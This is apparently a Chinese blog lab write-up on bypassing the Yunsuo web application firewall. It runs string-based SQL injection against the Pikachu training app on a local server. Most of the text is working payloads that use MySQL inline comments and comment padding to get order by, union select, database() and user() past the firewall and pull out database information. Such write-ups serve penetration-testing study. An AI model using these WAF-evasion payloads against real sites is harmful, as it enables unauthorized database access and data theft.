---
title: sql注入bass云锁
categories: 网络安全
tags:
  - SQL注入
  - 云锁
  - bypass
  - 渗透测试
abbrlink: 483bcf26
date: 2020-04-08 00:00:00
---

## 实验环境
云锁官网
https://www.yunsuo.com.cn/
下载的是公有云版本 云锁服务器端Windows版本
搭建的服务器是phpstudy版本的 Apache+mysql
使用的漏洞集成是pikachu的字符型SQL注入

漏洞页面
http://192.168.17.13/pikachu/vul/sqli/sqli_str.php?name=kobe&submit=%E6%9F%A5%E8%AF%A2



## 判断当前字段数
payload: kobe’ order by 2 --+
and 1=1 --+ 不拦截
and 1=2 --+ 不拦截
order by 拦截了

http://192.168.17.13/pikachu/vul/sqli/sqli_str.php?name=kobe%27%20order%20by%203%20--+&submit=%E6%9F%A5%E8%AF%A2

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200414122025205.png)

使用内联注入 /!100001by/ /!500005by/

bypass: kobe’ order /*!10001by*/ 2

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200414122102659.png)

## 判断显示位置
kobe’ and 1=2 union select 1,2 --+
拦截了union select

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200414122141866.png)

union 不拦截
select 不拦截
union select 拦截
union 字符 select 拦截
union /select/ 不拦截 

bypass: kobe’ and 1=2 union /*!50000all select*/ 1,2
显示的位置为1和2

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200414122312695.png)

## 获取数据库信息
拦截了database()，user()

bypass: database/**/()  user/**/()

完整的bypass语句：
kobe’ and 1=2 union /*!50001all select*/ database/**/(),user/**/() --+

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200414122349155.png)

成功获取：
uid:pikachu
email:root@localhost
